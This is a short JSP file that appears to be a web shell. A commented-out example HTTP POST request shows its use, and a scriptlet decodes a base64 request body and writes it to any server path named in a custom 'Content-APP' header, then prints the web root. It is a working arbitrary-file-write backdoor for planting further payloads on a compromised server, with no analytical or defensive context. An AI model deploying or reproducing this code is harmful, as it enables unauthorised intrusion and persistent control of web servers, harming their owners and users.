<!-- 

POST /writefile.jsp HTTP/1.1
Host: HOSTNAME
Connection: close
Content-APP: D:\path\file.jsp
Content-Length: 13

YmFzZTY0Cg==

-->

<jsp:scriptlet>
String f=request.getHeader("Content-APP");if(f!=null){sun.misc.BASE64Decoder b = new sun.misc.BASE64Decoder();new java.io.FileOutputStream(f).write(b.decodeBuffer(request.getInputStream()));}out.println(request.getSession().getServletContext().getRealPath(""));
</jsp:scriptlet>
